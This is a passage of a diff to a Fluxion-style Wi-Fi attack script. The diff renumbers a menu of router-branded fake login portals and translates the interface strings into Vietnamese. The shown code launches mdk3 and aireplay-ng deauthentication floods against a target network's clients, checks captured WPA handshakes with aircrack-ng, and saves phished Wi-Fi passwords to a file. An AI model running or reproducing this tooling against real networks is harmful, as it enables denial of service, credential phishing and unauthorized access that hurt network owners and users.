 				NETGEAR2
 				break
 
-			elif [ "$fluxass" = "30" ]; then
+			elif [ "$fluxass" = "31" ]; then
 				ARRIS2
 				break
 
-			elif [ "$fluxass" = "31" ]; then
+			elif [ "$fluxass" = "32" ]; then
 				VODAFONE
 				break
 
-			elif [ "$fluxass" = "32" ]; then
+			elif [ "$fluxass" = "33" ]; then
 				TPLINK
 				break
 
-			elif [ "$fluxass" = "33" ]; then
+			elif [ "$fluxass" = "34" ]; then
 				TPLINK_ITA
 				break
 
-			elif [ "$fluxass" = "34" ]; then
+			elif [ "$fluxass" = "35" ]; then
 				ZIGGO_NL
 				break
 
-			elif [ "$fluxass" = "35" ]; then
+			elif [ "$fluxass" = "36" ]; then
 				KPN_NL
 				break
 
-            elif [ "$fluxass" = "36" ]; then
+            elif [ "$fluxass" = "37" ]; then
                 ZIGGO2016_NL
                 break
 
-      		elif [ "$fluxass" = "37" ]; then
+      		elif [ "$fluxass" = "38" ]; then
 				FRITZBOX_DE
 				break
 
-		    elif [ "$fluxass" = "38" ]; then
+		    elif [ "$fluxass" = "39" ]; then
 				FRITZBOX_ENG
 				break
 
-			elif [ "$fluxass" = "39" ]; then
+			elif [ "$fluxass" = "40" ]; then
 				GENEXIS_DE
 				break
 
-			elif [ "$fluxass" = "40" ]; then
+			elif [ "$fluxass" = "41" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -2955,16 +3035,16 @@ function attack {
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
-	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
+	xterm -hold $TOPRIGHT -title "Thông tin Wifi" -e $DUMP_PATH/handcheck &
 	conditional_clear
 
 	while true; do
 		top
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" Attack in progress .."
+		echo -e ""$red"["$yellow"i"$red"]"$transparent" Đang trong quá trình tấn công .."
 		echo "                                       "
-		echo "      1) Choose another network"
-		echo "      2) Exit"
+		echo "      1) Chọn mạng khác"
+		echo "      2) Thoát"
 		echo " "
 		echo -n '      #> '
 		read yn
@@ -3142,11 +3222,11 @@ function handshakecheck {
 
 
 	if [ $authmode = "handshake" ]; then
-		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
+		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"Mật khẩu được lưu tại "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
 		">>$DUMP_PATH/handcheck
 
 	elif [ $authmode = "wpa_supplicant" ]; then
-		echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
+		echo "echo -e \"Mật khẩu được lưu tại "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
 	fi
 
 	echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
@@ -3166,13 +3246,13 @@ function handshakecheck {
 # Deauth all
 function deauthall {
 
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Từ chối tất cả máy khách tới $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
 
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Từ chối tất cả máy khách qua mdk3 tới $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
 }
 
@@ -3180,7 +3260,7 @@ function deauthmdk3 {
 function deauthesp {
 
 	sleep 2
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Từ chối máy khách $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 # Close all processes
